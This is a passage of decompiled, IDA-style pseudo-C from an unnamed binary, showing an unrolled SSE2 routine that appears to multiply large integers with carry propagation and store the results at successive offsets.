  v98 = _mm_move_epi64(v96);
  v99 = _mm_add_epi32(v93, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v95, v97), v97), 4));
  v100 = _mm_add_epi32(v94, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v96, v98), v98), 4));
  *(_DWORD *)(v101 + 40) = _mm_cvtsi128_si32(v99);
  v102 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v99), 0x10u), _mm_move_epi64(v100));
  v103 = _mm_unpackhi_epi64(v100, v97);
  *(_QWORD *)(v101 + 42) = v102.m128i_i64[0];
  v104 = _mm_add_epi32(_mm_unpackhi_epi64(v99, v97), _mm_srli_epi64(v102, 0x30u));
  v105 = _mm_load_si128(&v548);
  v106 = _mm_mul_epu32(_mm_load_si128(&v530), v105);
  v108 = _mm_mul_epu32(v105, *v107);
  v109 = _mm_load_si128(&stru_46C990);
  v110 = _mm_add_epi32(v104, _mm_and_si128(v109, v106));
  v111 = _mm_add_epi32(v103, _mm_srli_epi32(v106, 0x10u));
  v112 = _mm_and_si128(v109, v108);
  v113 = _mm_srli_epi32(v108, 0x10u);
  sub_4141B1();
  v114 = _mm_move_epi64(v112);
  v115 = _mm_move_epi64(v113);
  v116 = _mm_add_epi32(v110, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v112, v114), v114), 4));
  v117 = _mm_add_epi32(v111, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v113, v115), v115), 4));
  *(_DWORD *)(v118 + 48) = _mm_cvtsi128_si32(v116);
  v119 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v116), 0x10u), _mm_move_epi64(v117));
  v120 = _mm_unpackhi_epi64(v117, v114);
  *(_QWORD *)(v118 + 50) = v119.m128i_i64[0];
  v121 = _mm_add_epi32(_mm_unpackhi_epi64(v116, v114), _mm_srli_epi64(v119, 0x30u));
  v123 = _mm_load_si128(&v548);
  v124 = _mm_mul_epu32(_mm_load_si128(&v531), v123);
  v125 = _mm_mul_epu32(v123, v122[1]);
  v126 = _mm_load_si128(&stru_46C990);
  v127 = _mm_add_epi32(v121, _mm_and_si128(v126, v124));
  v128 = _mm_add_epi32(v120, _mm_srli_epi32(v124, 0x10u));
  v129 = _mm_and_si128(v126, v125);
  v130 = _mm_srli_epi32(v125, 0x10u);
  sub_414174();
  v131 = _mm_move_epi64(v129);
  v132 = _mm_move_epi64(v130);
  v133 = _mm_add_epi32(v127, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v129, v131), v131), 4));
  v134 = _mm_add_epi32(v128, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v130, v132), v132), 4));
  *(_DWORD *)(v135 + 56) = _mm_cvtsi128_si32(v133);
  v136 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v133), 0x10u), _mm_move_epi64(v134));
  v137 = _mm_unpackhi_epi64(v134, v131);
  *(_QWORD *)(v135 + 58) = v136.m128i_i64[0];
  v138 = _mm_add_epi32(_mm_unpackhi_epi64(v133, v131), _mm_srli_epi64(v136, 0x30u));
  v139 = _mm_load_si128(&v549);
  v140 = _mm_mul_epu32(_mm_load_si128(&v531), v139);
  v142 = _mm_mul_epu32(v139, *v141);
  v143 = _mm_load_si128(&stru_46C990);
  v144 = _mm_add_epi32(v138, _mm_and_si128(v143, v140));
  v145 = _mm_add_epi32(v137, _mm_srli_epi32(v140, 0x10u));
  v146 = _mm_and_si128(v143, v142);
  v147 = _mm_srli_epi32(v142, 0x10u);
  sub_414137();
  v148 = _mm_move_epi64(v146);
  v149 = _mm_move_epi64(v147);
  v150 = _mm_add_epi32(v144, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v146, v148), v148), 4));
  v151 = _mm_add_epi32(v145, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v147, v149), v149), 4));
  *(_DWORD *)(v152 + 64) = _mm_cvtsi128_si32(v150);
  v153 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v150), 0x10u), _mm_move_epi64(v151));
  v154 = _mm_unpackhi_epi64(v151, v148);
  *(_QWORD *)(v152 + 66) = v153.m128i_i64[0];
  v155 = _mm_add_epi32(_mm_unpackhi_epi64(v150, v148), _mm_srli_epi64(v153, 0x30u));
  v157 = _mm_load_si128(&v549);
  v158 = _mm_mul_epu32(_mm_load_si128(&v532), v157);
  v159 = _mm_mul_epu32(v157, v156[1]);
  v160 = _mm_load_si128(&stru_46C990);
  v161 = _mm_add_epi32(v155, _mm_and_si128(v160, v158));
  v162 = _mm_add_epi32(v154, _mm_srli_epi32(v158, 0x10u));
  v163 = _mm_and_si128(v160, v159);
  v164 = _mm_srli_epi32(v159, 0x10u);
  sub_4140FA();
  v165 = _mm_move_epi64(v163);
  v166 = _mm_move_epi64(v164);
  v167 = _mm_add_epi32(v161, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v163, v165), v165), 4));
  v168 = _mm_add_epi32(v162, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v164, v166), v166), 4));
  *(_DWORD *)(v169 + 72) = _mm_cvtsi128_si32(v167);
  v170 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v167), 0x10u), _mm_move_epi64(v168));
  v171 = _mm_unpackhi_epi64(v168, v165);
  *(_QWORD *)(v169 + 74) = v170.m128i_i64[0];
  v172 = _mm_add_epi32(_mm_unpackhi_epi64(v167, v165), _mm_srli_epi64(v170, 0x30u));
  v173 = _mm_load_si128(&v550);
  v174 = _mm_mul_epu32(_mm_load_si128(&v532), v173);
  v176 = _mm_mul_epu32(v173, *v175);
  v177 = _mm_load_si128(&stru_46C990);
  v178 = _mm_add_epi32(v172, _mm_and_si128(v177, v174));
  v179 = _mm_add_epi32(v171, _mm_srli_epi32(v174, 0x10u));
  v180 = _mm_and_si128(v177, v176);
  v181 = _mm_srli_epi32(v176, 0x10u);
  sub_4140BD();
  v182 = _mm_move_epi64(v180);
  v183 = _mm_move_epi64(v181);
  v184 = _mm_add_epi32(v178, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v180, v182), v182), 4));
  v185 = _mm_add_epi32(v179, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v181, v183), v183), 4));
  *(_DWORD *)(v186 + 80) = _mm_cvtsi128_si32(v184);
  v187 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v184), 0x10u), _mm_move_epi64(v185));
  v188 = _mm_unpackhi_epi64(v185, v182);
  *(_QWORD *)(v186 + 82) = v187.m128i_i64[0];
  v189 = _mm_add_epi32(_mm_unpackhi_epi64(v184, v182), _mm_srli_epi64(v187, 0x30u));
  v191 = _mm_load_si128(&v550);
  v192 = _mm_mul_epu32(_mm_load_si128(&v533), v191);
  v193 = _mm_mul_epu32(v191, v190[1]);
  v194 = _mm_load_si128(&stru_46C990);
  v195 = _mm_add_epi32(v189, _mm_and_si128(v194, v192));
  v196 = _mm_add_epi32(v188, _mm_srli_epi32(v192, 0x10u));
  v197 = _mm_and_si128(v194, v193);
  v198 = _mm_srli_epi32(v193, 0x10u);
  sub_414080();
  v199 = _mm_move_epi64(v197);
  v200 = _mm_move_epi64(v198);
  v201 = _mm_add_epi32(v195, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v197, v199), v199), 4));
  v202 = _mm_add_epi32(v196, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v198, v200), v200), 4));
  *(_DWORD *)(v203 + 88) = _mm_cvtsi128_si32(v201);
  v204 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v201), 0x10u), _mm_move_epi64(v202));
  v205 = _mm_unpackhi_epi64(v202, v199);
  *(_QWORD *)(v203 + 90) = v204.m128i_i64[0];
  v206 = _mm_add_epi32(_mm_unpackhi_epi64(v201, v199), _mm_srli_epi64(v204, 0x30u));
  v207 = _mm_load_si128(&v551);
  v208 = _mm_mul_epu32(_mm_load_si128(&v533), v207);
  v210 = _mm_mul_epu32(v207, *v209);
  v211 = _mm_load_si128(&stru_46C990);
  v212 = _mm_add_epi32(v206, _mm_and_si128(v211, v208));
  v213 = _mm_add_epi32(v205, _mm_srli_epi32(v208, 0x10u));
  v214 = _mm_and_si128(v211, v210);
  v215 = _mm_srli_epi32(v210, 0x10u);
  sub_414043();
  v216 = _mm_move_epi64(v214);
  v217 = _mm_move_epi64(v215);
  v218 = _mm_add_epi32(v212, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v214, v216), v216), 4));
  v219 = _mm_add_epi32(v213, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v215, v217), v217), 4));
  *(_DWORD *)(v220 + 96) = _mm_cvtsi128_si32(v218);
  v221 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v218), 0x10u), _mm_move_epi64(v219));
  v222 = _mm_unpackhi_epi64(v219, v216);
  *(_QWORD *)(v220 + 98) = v221.m128i_i64[0];
  v223 = _mm_add_epi32(_mm_unpackhi_epi64(v218, v216), _mm_srli_epi64(v221, 0x30u));
  v225 = _mm_load_si128(&v551);
  v226 = _mm_mul_epu32(_mm_load_si128(&v534), v225);
  v227 = _mm_mul_epu32(v225, v224[1]);
  v228 = _mm_load_si128(&stru_46C990);
  v229 = _mm_add_epi32(v223, _mm_and_si128(v228, v226));
  v230 = _mm_add_epi32(v222, _mm_srli_epi32(v226, 0x10u));
  v231 = _mm_and_si128(v228, v227);
  v232 = _mm_srli_epi32(v227, 0x10u);
  sub_414006();
  v233 = _mm_move_epi64(v231);
  v234 = _mm_move_epi64(v232);
  v235 = _mm_add_epi32(v229, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v231, v233), v233), 4));
  v236 = _mm_add_epi32(v230, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v232, v234), v234), 4));
  *(_DWORD *)(v237 + 104) = _mm_cvtsi128_si32(v235);
  v238 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v235), 0x10u), _mm_move_epi64(v236));
  v239 = _mm_unpackhi_epi64(v236, v233);
  *(_QWORD *)(v237 + 106) = v238.m128i_i64[0];
  v240 = _mm_add_epi32(_mm_unpackhi_epi64(v235, v233), _mm_srli_epi64(v238, 0x30u));
  v241 = _mm_load_si128(&v552);
  v242 = _mm_mul_epu32(_mm_load_si128(&v534), v241);
  v244 = _mm_mul_epu32(v241, *v243);
  v245 = _mm_load_si128(&stru_46C990);
  v246 = _mm_add_epi32(v240, _mm_and_si128(v245, v242));
  v247 = _mm_add_epi32(v239, _mm_srli_epi32(v242, 0x10u));
  v248 = _mm_and_si128(v245, v244);
  v249 = _mm_srli_epi32(v244, 0x10u);
  sub_413FC9();
  v250 = _mm_move_epi64(v248);
  v251 = _mm_move_epi64(v249);
  v252 = _mm_add_epi32(v246, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v248, v250), v250), 4));
  v253 = _mm_add_epi32(v247, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v249, v251), v251), 4));
  *(_DWORD *)(v254 + 112) = _mm_cvtsi128_si32(v252);
  v255 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v252), 0x10u), _mm_move_epi64(v253));
  v256 = _mm_unpackhi_epi64(v253, v250);
  *(_QWORD *)(v254 + 114) = v255.m128i_i64[0];
  v257 = _mm_add_epi32(_mm_unpackhi_epi64(v252, v250), _mm_srli_epi64(v255, 0x30u));
  v259 = _mm_load_si128(&v552);
  v260 = _mm_mul_epu32(_mm_load_si128(&v535), v259);
  v261 = _mm_mul_epu32(v259, v258[1]);
  v262 = _mm_load_si128(&stru_46C990);
  v263 = _mm_add_epi32(v257, _mm_and_si128(v262, v260));
  v264 = _mm_add_epi32(v256, _mm_srli_epi32(v260, 0x10u));
  v265 = _mm_and_si128(v262, v261);
  v266 = _mm_srli_epi32(v261, 0x10u);
  sub_413F89();
  v267 = _mm_move_epi64(v265);
  v268 = _mm_move_epi64(v266);
  v269 = _mm_add_epi32(v263, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v265, v267), v267), 4));
  v270 = _mm_add_epi32(v264, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v266, v268), v268), 4));
  *(_DWORD *)(v271 + 120) = _mm_cvtsi128_si32(v269);
  v272 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v269), 0x10u), _mm_move_epi64(v270));
  v273 = _mm_unpackhi_epi64(v270, v267);
  *(_QWORD *)(v271 + 122) = v272.m128i_i64[0];
  v274 = _mm_add_epi32(_mm_unpackhi_epi64(v269, v267), _mm_srli_epi64(v272, 0x30u));
  v275 = _mm_load_si128(&v553);
  v276 = _mm_mul_epu32(_mm_load_si128(&v535), v275);
  v278 = _mm_mul_epu32(v275, *v277);
  v279 = _mm_load_si128(&stru_46C990);
  v280 = _mm_add_epi32(v274, _mm_and_si128(v279, v276));
  v281 = _mm_add_epi32(v273, _mm_srli_epi32(v276, 0x10u));
  v282 = _mm_and_si128(v279, v278);
  v283 = _mm_srli_epi32(v278, 0x10u);
  sub_413FC9();
  v284 = _mm_move_epi64(v282);
  v285 = _mm_move_epi64(v283);
  v286 = _mm_add_epi32(v280, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v282, v284), v284), 4));
  v287 = _mm_add_epi32(v281, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v283, v285), v285), 4));
  *(_DWORD *)(v288 + 128) = _mm_cvtsi128_si32(v286);
  v289 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v286), 0x10u), _mm_move_epi64(v287));
  v290 = _mm_unpackhi_epi64(v287, v284);
  *(_QWORD *)(v288 + 130) = v289.m128i_i64[0];
  v291 = _mm_add_epi32(_mm_unpackhi_epi64(v286, v284), _mm_srli_epi64(v289, 0x30u));
  v293 = _mm_load_si128(&v553);
  v294 = _mm_mul_epu32(_mm_load_si128(&v536), v293);
  v295 = _mm_mul_epu32(v293, v292[1]);
  v296 = _mm_load_si128(&stru_46C990);
  v297 = _mm_add_epi32(v291, _mm_and_si128(v296, v294));
  v298 = _mm_add_epi32(v290, _mm_srli_epi32(v294, 0x10u));
  v299 = _mm_and_si128(v296, v295);
  v300 = _mm_srli_epi32(v295, 0x10u);
  sub_414006();
  v301 = _mm_move_epi64(v299);
  v302 = _mm_move_epi64(v300);
  v303 = _mm_add_epi32(v297, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v299, v301), v301), 4));
  v304 = _mm_add_epi32(v298, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v300, v302), v302), 4));
  *(_DWORD *)(v305 + 136) = _mm_cvtsi128_si32(v303);
  v306 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v303), 0x10u), _mm_move_epi64(v304));
  v307 = _mm_unpackhi_epi64(v304, v301);
  *(_QWORD *)(v305 + 138) = v306.m128i_i64[0];
  v308 = _mm_add_epi32(_mm_unpackhi_epi64(v303, v301), _mm_srli_epi64(v306, 0x30u));
  v309 = _mm_load_si128(&v554);
  v310 = _mm_mul_epu32(_mm_load_si128(&v536), v309);
  v312 = _mm_mul_epu32(v309, *v311);
  v313 = _mm_load_si128(&stru_46C990);
  v314 = _mm_add_epi32(v308, _mm_and_si128(v313, v310));
  v315 = _mm_add_epi32(v307, _mm_srli_epi32(v310, 0x10u));
  v316 = _mm_and_si128(v313, v312);
  v317 = _mm_srli_epi32(v312, 0x10u);
  sub_414043();
  v318 = _mm_move_epi64(v316);
  v319 = _mm_move_epi64(v317);
  v320 = _mm_add_epi32(v314, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v316, v318), v318), 4));
  v321 = _mm_add_epi32(v315, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v317, v319), v319), 4));
  *(_DWORD *)(v322 + 144) = _mm_cvtsi128_si32(v320);
  v323 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v320), 0x10u), _mm_move_epi64(v321));
  v324 = _mm_unpackhi_epi64(v321, v318);
  *(_QWORD *)(v322 + 146) = v323.m128i_i64[0];
  v325 = _mm_add_epi32(_mm_unpackhi_epi64(v320, v318), _mm_srli_epi64(v323, 0x30u));
  v327 = _mm_load_si128(&v554);
  v328 = _mm_mul_epu32(_mm_load_si128(&v537), v327);
  v329 = _mm_mul_epu32(v327, v326[1]);
  v330 = _mm_load_si128(&stru_46C990);
  v331 = _mm_add_epi32(v325, _mm_and_si128(v330, v328));
  v332 = _mm_add_epi32(v324, _mm_srli_epi32(v328, 0x10u));
  v333 = _mm_and_si128(v330, v329);
  v334 = _mm_srli_epi32(v329, 0x10u);
  sub_414080();
  v335 = _mm_move_epi64(v333);
  v336 = _mm_move_epi64(v334);
  v337 = _mm_add_epi32(v331, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v333, v335), v335), 4));
  v338 = _mm_add_epi32(v332, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v334, v336), v336), 4));
  *(_DWORD *)(v339 + 152) = _mm_cvtsi128_si32(v337);
  v340 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v337), 0x10u), _mm_move_epi64(v338));
  v341 = _mm_unpackhi_epi64(v338, v335);
  *(_QWORD *)(v339 + 154) = v340.m128i_i64[0];
  v342 = _mm_add_epi32(_mm_unpackhi_epi64(v337, v335), _mm_srli_epi64(v340, 0x30u));
  v343 = _mm_load_si128(&v555);
  v344 = _mm_mul_epu32(_mm_load_si128(&v537), v343);
  v346 = _mm_mul_epu32(v343, *v345);
  v347 = _mm_load_si128(&stru_46C990);
  v348 = _mm_add_epi32(v342, _mm_and_si128(v347, v344));
  v349 = _mm_add_epi32(v341, _mm_srli_epi32(v344, 0x10u));
  v350 = _mm_and_si128(v347, v346);
  v351 = _mm_srli_epi32(v346, 0x10u);
  sub_4140BD();
  v352 = _mm_move_epi64(v350);
  v353 = _mm_move_epi64(v351);
  v354 = _mm_add_epi32(v348, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v350, v352), v352), 4));
  v355 = _mm_add_epi32(v349, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v351, v353), v353), 4));
  *(_DWORD *)(v356 + 160) = _mm_cvtsi128_si32(v354);
  v357 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v354), 0x10u), _mm_move_epi64(v355));
  v358 = _mm_unpackhi_epi64(v355, v352);
  *(_QWORD *)(v356 + 162) = v357.m128i_i64[0];
  v359 = _mm_add_epi32(_mm_unpackhi_epi64(v354, v352), _mm_srli_epi64(v357, 0x30u));
  v361 = _mm_load_si128(&v555);
  v362 = _mm_mul_epu32(_mm_load_si128(&v538), v361);
  v363 = _mm_mul_epu32(v361, v360[1]);
  v364 = _mm_load_si128(&stru_46C990);
  v365 = _mm_add_epi32(v359, _mm_and_si128(v364, v362));
  v366 = _mm_add_epi32(v358, _mm_srli_epi32(v362, 0x10u));
  v367 = _mm_and_si128(v364, v363);
  v368 = _mm_srli_epi32(v363, 0x10u);
  sub_4140FA();
  v369 = _mm_move_epi64(v367);
  v370 = _mm_move_epi64(v368);
  v371 = _mm_add_epi32(v365, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v367, v369), v369), 4));
  v372 = _mm_add_epi32(v366, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v368, v370), v370), 4));
  *(_DWORD *)(v373 + 168) = _mm_cvtsi128_si32(v371);
  v374 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v371), 0x10u), _mm_move_epi64(v372));
  v375 = _mm_unpackhi_epi64(v372, v369);
  *(_QWORD *)(v373 + 170) = v374.m128i_i64[0];
  v376 = _mm_add_epi32(_mm_unpackhi_epi64(v371, v369), _mm_srli_epi64(v374, 0x30u));
  v377 = _mm_load_si128(&v556);
  v378 = _mm_mul_epu32(_mm_load_si128(&v538), v377);
  v380 = _mm_mul_epu32(v377, *v379);
  v381 = _mm_load_si128(&stru_46C990);
  v382 = _mm_add_epi32(v376, _mm_and_si128(v381, v378));
  v383 = _mm_add_epi32(v375, _mm_srli_epi32(v378, 0x10u));
  v384 = _mm_and_si128(v381, v380);
  v385 = _mm_srli_epi32(v380, 0x10u);
  sub_414137();
  v386 = _mm_move_epi64(v384);
  v387 = _mm_move_epi64(v385);
  v388 = _mm_add_epi32(v382, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v384, v386), v386), 4));
  v389 = _mm_add_epi32(v383, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v385, v387), v387), 4));
  *(_DWORD *)(v390 + 176) = _mm_cvtsi128_si32(v388);
  v391 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v388), 0x10u), _mm_move_epi64(v389));
  v392 = _mm_unpackhi_epi64(v389, v386);
  *(_QWORD *)(v390 + 178) = v391.m128i_i64[0];
  v393 = _mm_add_epi32(_mm_unpackhi_epi64(v388, v386), _mm_srli_epi64(v391, 0x30u));
  v395 = _mm_load_si128(&v556);
  v396 = _mm_mul_epu32(_mm_load_si128(&v539), v395);
  v397 = _mm_mul_epu32(v395, v394[1]);
  v398 = _mm_load_si128(&stru_46C990);
  v399 = _mm_add_epi32(v393, _mm_and_si128(v398, v396));
  v400 = _mm_add_epi32(v392, _mm_srli_epi32(v396, 0x10u));
  v401 = _mm_and_si128(v398, v397);
  v402 = _mm_srli_epi32(v397, 0x10u);
  sub_414174();
  v403 = _mm_move_epi64(v401);
  v404 = _mm_move_epi64(v402);
  v405 = _mm_add_epi32(v399, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v401, v403), v403), 4));
  v406 = _mm_add_epi32(v400, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v402, v404), v404), 4));
  *(_DWORD *)(v407 + 184) = _mm_cvtsi128_si32(v405);
  v408 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v405), 0x10u), _mm_move_epi64(v406));
  v409 = _mm_unpackhi_epi64(v406, v403);
  *(_QWORD *)(v407 + 186) = v408.m128i_i64[0];
  v410 = _mm_add_epi32(_mm_unpackhi_epi64(v405, v403), _mm_srli_epi64(v408, 0x30u));
  v411 = _mm_load_si128(&v557);
  v412 = _mm_mul_epu32(_mm_load_si128(&v539), v411);
  v414 = _mm_mul_epu32(v411, *v413);
  v415 = _mm_load_si128(&stru_46C990);
  v416 = _mm_add_epi32(v410, _mm_and_si128(v415, v412));
  v417 = _mm_add_epi32(v409, _mm_srli_epi32(v412, 0x10u));
  v418 = _mm_and_si128(v415, v414);
  v419 = _mm_srli_epi32(v414, 0x10u);
  sub_4141B1();
  v420 = _mm_move_epi64(v418);
  v421 = _mm_move_epi64(v419);
  v422 = _mm_add_epi32(v416, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v418, v420), v420), 4));
  v423 = _mm_add_epi32(v417, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v419, v421), v421), 4));
  *(_DWORD *)(v424 + 192) = _mm_cvtsi128_si32(v422);
  v425 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v422), 0x10u), _mm_move_epi64(v423));
  v426 = _mm_unpackhi_epi64(v423, v420);
  *(_QWORD *)(v424 + 194) = v425.m128i_i64[0];
  v427 = _mm_add_epi32(_mm_unpackhi_epi64(v422, v420), _mm_srli_epi64(v425, 0x30u));
  v429 = _mm_load_si128(&v557);
  v430 = _mm_mul_epu32(_mm_load_si128(&v540), v429);
  v431 = _mm_mul_epu32(v429, v428[1]);
  v432 = _mm_load_si128(&stru_46C990);
  v433 = _mm_add_epi32(v427, _mm_and_si128(v432, v430));
  v434 = _mm_add_epi32(v426, _mm_srli_epi32(v430, 0x10u));
  v435 = _mm_and_si128(v432, v431);
  v436 = _mm_srli_epi32(v431, 0x10u);
  sub_4141EE();
  v437 = _mm_move_epi64(v435);
  v438 = _mm_move_epi64(v436);
  v439 = _mm_add_epi32(v433, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v435, v437), v437), 4));
  v440 = _mm_add_epi32(v434, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v436, v438), v438), 4));
  *(_DWORD *)(v441 + 200) = _mm_cvtsi128_si32(v439);
  v442 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v439), 0x10u), _mm_move_epi64(v440));
  v443 = _mm_unpackhi_epi64(v440, v437);
  *(_QWORD *)(v441 + 202) = v442.m128i_i64[0];
  v444 = _mm_add_epi32(_mm_unpackhi_epi64(v439, v437), _mm_srli_epi64(v442, 0x30u));
  v445 = _mm_load_si128(&v558);
  v446 = _mm_mul_epu32(_mm_load_si128(&v540), v445);
  v448 = _mm_mul_epu32(v445, *v447);
  v449 = _mm_load_si128(&stru_46C990);
  v450 = _mm_add_epi32(v444, _mm_and_si128(v449, v446));
  v451 = _mm_add_epi32(v443, _mm_srli_epi32(v446, 0x10u));
  v452 = _mm_and_si128(v449, v448);
  v453 = _mm_srli_epi32(v448, 0x10u);
  sub_41422B();
  v454 = _mm_move_epi64(v452);
  v455 = _mm_move_epi64(v453);
  v456 = _mm_add_epi32(v450, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v452, v454), v454), 4));
  v457 = _mm_add_epi32(v451, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v453, v455), v455), 4));
  *(_DWORD *)(v458 + 208) = _mm_cvtsi128_si32(v456);
  v459 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v456), 0x10u), _mm_move_epi64(v457));
  v460 = _mm_unpackhi_epi64(v457, v454);
  *(_QWORD *)(v458 + 210) = v459.m128i_i64[0];
  v461 = _mm_add_epi32(_mm_unpackhi_epi64(v456, v454), _mm_srli_epi64(v459, 0x30u));
  v463 = _mm_load_si128(&v558);
  v464 = _mm_mul_epu32(_mm_load_si128(&v541), v463);
  v465 = _mm_mul_epu32(v463, v462[1]);
  v466 = _mm_load_si128(&stru_46C990);
  v467 = _mm_add_epi32(v461, _mm_and_si128(v466, v464));
  v468 = _mm_add_epi32(v460, _mm_srli_epi32(v464, 0x10u));
  v469 = _mm_and_si128(v466, v465);
  v470 = _mm_srli_epi32(v465, 0x10u);
  sub_414268();
  v471 = _mm_move_epi64(v469);
  v472 = _mm_move_epi64(v470);
  v473 = _mm_add_epi32(v467, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v469, v471), v471), 4));
  v474 = _mm_add_epi32(v468, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v470, v472), v472), 4));
  *(_DWORD *)(v475 + 216) = _mm_cvtsi128_si32(v473);
  v476 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v473), 0x10u), _mm_move_epi64(v474));
  v477 = _mm_unpackhi_epi64(v474, v471);
  *(_QWORD *)(v475 + 218) = v476.m128i_i64[0];
  v478 = _mm_add_epi32(_mm_unpackhi_epi64(v473, v471), _mm_srli_epi64(v476, 0x30u));
  v479 = _mm_load_si128(&v559);
  v480 = _mm_mul_epu32(_mm_load_si128(&v541), v479);
  v482 = _mm_mul_epu32(v479, *v481);
  v483 = _mm_load_si128(&stru_46C990);
  v484 = _mm_add_epi32(v478, _mm_and_si128(v483, v480));
  v485 = _mm_add_epi32(v477, _mm_srli_epi32(v480, 0x10u));
  v486 = _mm_and_si128(v483, v482);
  v487 = _mm_srli_epi32(v482, 0x10u);
  sub_4142A5();
  v488 = _mm_move_epi64(v486);
  v489 = _mm_move_epi64(v487);
  v490 = _mm_add_epi32(v484, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v486, v488), v488), 4));
  v491 = _mm_add_epi32(v485, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v487, v489), v489), 4));
  *(_DWORD *)(v492 + 224) = _mm_cvtsi128_si32(v490);
  v493 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v490), 0x10u), _mm_move_epi64(v491));
  v494 = _mm_unpackhi_epi64(v491, v488);
  *(_QWORD *)(v492 + 226) = v493.m128i_i64[0];
  v495 = _mm_add_epi32(_mm_unpackhi_epi64(v490, v488), _mm_srli_epi64(v493, 0x30u));
  v497 = _mm_load_si128(&v559);
  v498 = _mm_mul_epu32(_mm_load_si128(&v542), v497);
  v499 = _mm_mul_epu32(v497, v496[1]);
  v500 = _mm_load_si128(&stru_46C990);
  v501 = _mm_add_epi32(v495, _mm_and_si128(v500, v498));
  v502 = _mm_add_epi32(v494, _mm_srli_epi32(v498, 0x10u));
  v503 = _mm_and_si128(v500, v499);
  v504 = _mm_srli_epi32(v499, 0x10u);
  sub_4142E2((int)&v542, &v559);
  v505 = _mm_move_epi64(v503);
  v506 = _mm_move_epi64(v504);
  v507 = _mm_add_epi32(v501, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v503, v505), v505), 4));
  v508 = _mm_add_epi32(v502, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v504, v506), v506), 4));
  *(_DWORD *)(v509 + 232) = _mm_cvtsi128_si32(v507);
  v510 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v507), 0x10u), _mm_move_epi64(v508));
  v511 = _mm_unpackhi_epi64(v508, v505);
  *(_QWORD *)(v509 + 234) = v510.m128i_i64[0];
  v512 = _mm_add_epi32(_mm_unpackhi_epi64(v507, v505), _mm_srli_epi64(v510, 0x30u));
  v513 = _mm_load_si128(&v560);
  v514 = _mm_mul_epu32(_mm_load_si128(&v542), v513);
